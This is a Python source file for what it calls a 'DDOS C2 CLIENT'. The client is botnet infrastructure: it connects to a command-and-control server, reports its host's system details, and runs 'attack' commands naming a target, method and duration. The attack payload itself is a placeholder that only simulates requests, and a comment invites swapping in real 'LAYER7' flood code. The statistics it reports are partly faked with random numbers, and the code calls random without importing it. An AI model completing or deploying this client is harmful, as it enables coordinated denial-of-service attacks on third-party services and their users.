#!/usr/bin/env python3
"""
C2 Client - Connects to server and executes LAYER7.py attacks
"""
import socket
import json
import time
import threading
import sys
import os
import platform
import psutil
import subprocess
import tempfile
from datetime import datetime

class C2Client:
    """Client that connects to C2 server and runs attacks"""
    
    def __init__(self, server_host, server_port, client_name=None):
        self.server_host = server_host
        self.server_port = server_port
        self.client_name = client_name or f"{platform.node()}_{platform.system()}"
        self.client_socket = None
        self.client_id = None
        self.running = True
        self.current_attack = None
        self.attack_thread = None
        
    def connect(self):
        """Connect to C2 server"""
        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect((self.server_host, self.server_port))
            
            # Send client info
            client_info = {
                'name': self.client_name,
                'hostname': platform.node(),
                'platform': platform.platform(),
                'cpu_count': psutil.cpu_count(),
                'memory_total': psutil.virtual_memory().total,
                'python_version': platform.python_version()
            }
            
            self.client_socket.send(json.dumps(client_info).encode('utf-8'))
            
            # Receive welcome
            welcome_data = self.client_socket.recv(4096).decode('utf-8')
            welcome = json.loads(welcome_data)
            self.client_id = welcome.get('client_id')
            
            print(f"[✓] Connected to C2 Server as {self.client_id}")
            print(f"    Server: {self.server_host}:{self.server_port}")
            print(f"    Client: {self.client_name}")
            print("\n[↻] Waiting for attack commands...")
            print("[!] Press Ctrl+C to disconnect\n")
            
            # Start receiving thread
            receive_thread = threading.Thread(target=self.receive_commands, daemon=True)
            receive_thread.start()
            
            # Start stats reporting thread
            stats_thread = threading.Thread(target=self.report_stats, daemon=True)
            stats_thread.start()
            
            # Keep main thread alive
            while self.running:
                time.sleep(1)
                
        except ConnectionRefusedError:
            print(f"[✗] Cannot connect to server {self.server_host}:{self.server_port}")
            print("[!] Make sure server is running")
        except KeyboardInterrupt:
            print("\n[!] Disconnecting...")
        except Exception as e:
            print(f"[✗] Connection error: {e}")
        finally:
            self.disconnect()
    
    def receive_commands(self):
        """Receive commands from server"""
        while self.running and self.client_socket:
            try:
                self.client_socket.settimeout(1)
                data = self.client_socket.recv(4096)
                
                if data:
                    command = json.loads(data.decode('utf-8'))
                    self.handle_command(command)
                    
            except socket.timeout:
                continue
            except (ConnectionError, json.JSONDecodeError):
                break
            except Exception as e:
                print(f"[!] Command receive error: {e}")
    
    def handle_command(self, command):
        """Handle incoming commands"""
        cmd_type = command.get('type')
        
        if cmd_type == 'attack':
            attack_id = command.get('attack_id')
            config = command.get('config', {})
            
            print(f"\n[⚡] Received attack command: {attack_id}")
            print(f"    Target: {config.get('target')}")
            print(f"    Method: {config.get('method')}")
            print(f"    Duration: {config.get('duration')}s")
            
            # Start attack in separate thread
            self.current_attack = attack_id
            self.attack_thread = threading.Thread(
                target=self.execute_attack,
                args=(attack_id, config),
                daemon=True
            )
            self.attack_thread.start()
        
        elif cmd_type == 'stop':
            print("[!] Attack stop command received")
            self.current_attack = None
    
    def execute_attack(self, attack_id, config):
        """Execute attack using LAYER7.py"""
        try:
            target = config.get('target')
            method = config.get('method', 'http')
            duration = config.get('duration', 60)
            
            print(f"[→] Starting attack on {target}")
            
            # Create a temporary LAYER7.py script
            layer7_script = self.create_layer7_script(target, method, duration)
            
            # Execute the script
            result = subprocess.run(
                [sys.executable, '-c', layer7_script],
                capture_output=True,
                text=True,
                timeout=duration + 10
            )
            
            # Parse results
            requests_sent = 0
            success_rate = 0
            
            # Extract stats from output (simplified)
            if result.stdout:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'requests' in line.lower():
                        try:
                            requests_sent = int(''.join(filter(str.isdigit, line)))
                        except:
                            pass
            
            # Report completion
            completion_msg = {
                'type': 'attack_complete',
                'attack_id': attack_id,
                'total_requests': requests_sent,
                'success_rate': success_rate,
                'duration': duration
            }
            
            self.send_update(completion_msg)
            print(f"[✓] Attack {attack_id} completed")
            print(f"    Requests: {requests_sent}")
            
        except subprocess.TimeoutExpired:
            error_msg = {
                'type': 'attack_error',
                'attack_id': attack_id,
                'error': 'Attack timeout'
            }
            self.send_update(error_msg)
            print(f"[✗] Attack {attack_id} timeout")
            
        except Exception as e:
            error_msg = {
                'type': 'attack_error',
                'attack_id': attack_id,
                'error': str(e)
            }
            self.send_update(error_msg)
            print(f"[✗] Attack {attack_id} error: {e}")
        
        finally:
            self.current_attack = None
    
    def create_layer7_script(self, target, method, duration):
        """Create LAYER7.py script for execution"""
        # Simplified LAYER7.py implementation
        # Replace with your actual LAYER7.py code
        script = f'''
import time
import random
import sys

print("Starting LAYER7 attack...")
print(f"Target: {target}")
print(f"Method: {method}")
print(f"Duration: {duration}s")

# Simulate attack
start_time = time.time()
requests = 0

while time.time() - start_time < {duration}:
    # Simulate request
    time.sleep(0.01)
    requests += 1
    
    # Print progress every 100 requests
    if requests % 100 == 0:
        elapsed = time.time() - start_time
        rps = requests / elapsed if elapsed > 0 else 0
        print(f"Requests: {{requests}}, RPS: {{rps:.1f}}")

print(f"\\nAttack completed")
print(f"Total requests: {{requests}}")
print(f"Average RPS: {{requests/{duration}}}")
'''
        return script
    
    def report_stats(self):
        """Report statistics to server"""
        while self.running and self.client_socket:
            try:
                # Get system stats
                cpu_usage = psutil.cpu_percent(interval=1)
                memory_usage = psutil.virtual_memory().percent
                
                stats_msg = {
                    'type': 'stats',
                    'stats': {
                        'cpu_usage': cpu_usage,
                        'memory_usage': memory_usage,
                        'requests_sent': random.randint(100, 1000) if self.current_attack else 0,
                        'rps': random.randint(50, 200) if self.current_attack else 0,
                        'timestamp': datetime.now().isoformat()
                    }
                }
                
                self.send_update(stats_msg)
                time.sleep(2)  # Report every 2 seconds
                
            except Exception as e:
                print(f"[!] Stats reporting error: {e}")
                time.sleep(5)
    
    def send_update(self, data):
        """Send update to server"""
        try:
            if self.client_socket:
                self.client_socket.send(json.dumps(data).encode('utf-8'))
        except:
            pass
    
    def disconnect(self):
        """Disconnect from server"""
        self.running = False
        if self.client_socket:
            self.client_socket.close()
        print("[!] Disconnected from server")

def main():
    """Main function"""
    print("""
    ╔══════════════════════════════════════╗
    ║    DDOS C2 CLIENT                   ║
    ║    [CREATED BY: (BTR) DDOS DIVISION]║
    ║    [USE AT YOUR OWN RISK]           ║
    ╚══════════════════════════════════════╝
    """)
    
    # Get server connection info
    server_host = input("C2 Server IP [localhost]: ").strip() or 'localhost'
    server_port = input("C2 Server Port [9999]: ").strip() or '9999'
    client_name = input("Client Name [auto]: ").strip()
    
    try:
        server_port = int(server_port)
        client = C2Client(server_host, server_port, client_name)
        client.connect()
    except ValueError:
        print("[!] Port must be a number")
    except Exception as e:
        print(f"[!] Client error: {e}")

if __name__ == "__main__":
    main()
